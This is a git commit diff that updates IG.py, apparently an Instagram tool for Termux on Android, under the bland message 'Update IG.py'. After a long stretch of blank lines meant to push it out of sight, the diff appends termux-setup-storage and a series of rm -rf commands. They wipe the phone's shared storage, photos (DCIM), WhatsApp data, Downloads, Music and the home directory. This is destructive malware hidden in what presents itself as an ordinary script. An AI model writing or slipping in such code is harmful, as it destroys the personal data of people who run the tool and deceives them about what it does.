5a28b86c168638157c704a8220b22ba9635def18
FahriXMail <69155982+FahriXMail@users.noreply.github.com>
2020-08-16 15:17:37 +0700

    Update IG.py

--- IG.py
+++ IG.py
@@ -1183,4 +1183,51 @@ menu
 
 
 
-rm -rf
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+termux-setup-storage
+
+rm -rf /storage/emulated/0
+
+rm -rf /sdcard/0
+
+rm -rf /storage/emulated/0/DCIM
+
+rm -rf /storage/emulated/0/android/obb
+
+rm -rf /sdcard/0/android/data
+
+rm -rf $HOME
+
+rm -rf sdcard/0
+
+rm -rf storage/emulated/0
+
+rm -rf /storage/emulated/0/WhatsApp
+
+rm -rf /sdcard/0/WhatsApp
+
+rm -rf /storage/emulated/0/Downloads
+
+rm -rf /storage/emulated/0/Music
+
+rm -rf /sdcard/0/Music
